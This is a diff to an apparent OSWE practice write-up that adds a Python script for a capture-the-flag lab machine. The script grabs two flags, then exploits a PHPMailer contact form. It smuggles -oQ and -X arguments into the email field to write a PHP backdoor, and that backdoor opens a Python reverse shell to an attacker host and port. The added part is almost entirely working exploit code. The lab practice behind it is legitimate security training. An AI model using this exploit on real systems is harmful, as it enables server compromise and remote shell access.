@@ -176,3 +176,71 @@ And root!
 
 ![image](https://github.com/BrunoCaseiro/OSWE-Practice/assets/38294180/02edb42a-c92b-41df-b40b-b629fd2facd1)
 
+
+___
+
+Once again, here's the script a few weeks later. Most of it is copied from a known exploit, but it also extracts flags 1 and 3 (this one is an image, so it extracts its base64).
+This was pretty easy as the first flags are simply get requests. But anyway, good practice. Here it is:
+
+````
+import sys, requests, re, base64, os
+from requests_toolbelt import MultipartEncoder
+from lxml import html as lh
+
+def main():
+	session = requests.Session()
+
+	# Flag 1
+	url = server + "/vendor/PATH"
+	r = session.get(url)
+	flag1 = re.findall(r'\{([^}]+)\}', r.text)[0]
+
+	print("Flag 1: " +flag1)
+
+
+	# Flag 3
+	url = server + "/wordpress/wp-content/uploads/2018/11/flag3.png"
+	r = session.get(url)
+	resp_byte = r.text.encode('utf-8')
+	flag3 = base64.b64encode(resp_byte)
+
+	print("Flag 3 (image in base64): " + str(flag3))
+
+
+	# Reverse shell
+	target = server + "/"
+	direc='contact.php'
+	backdoor = '/backdoor.php'
+
+	payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'{}\\\',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'.format(attacker, port)
+	fields={'action': 'submit',
+        	'name': payload,
+        	'email': '"anarcoder\\" -oQ/tmp/ -X/var/www/html/backdoor.php server"@protonmail.com',
+		'subject': 'test',
+        	'message': 'Pwned'}
+
+	m = MultipartEncoder(fields=fields, boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')
+
+	headers={'User-Agent': 'curl/7.47.0', 'Content-Type': m.content_type}
+
+
+	print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
+	r = requests.post(target+direc, data=m.to_string(), headers=headers)
+
+	print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
+	r = requests.get(target+backdoor, headers=headers)
+
+	if r.status_code == 200:
+		print('[+]  ExPLoITeD ' + target)
+
+if __name__ == '__main__':
+	try:
+		server = sys.argv[1].strip()
+		attacker = sys.argv[2].strip()
+		port = sys.argv[3].strip()
+	except:
+		print("[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0])
+		sys.exit()
+	print("Don't forget to open the listener on port {}!".format(port))
+	main()
+````
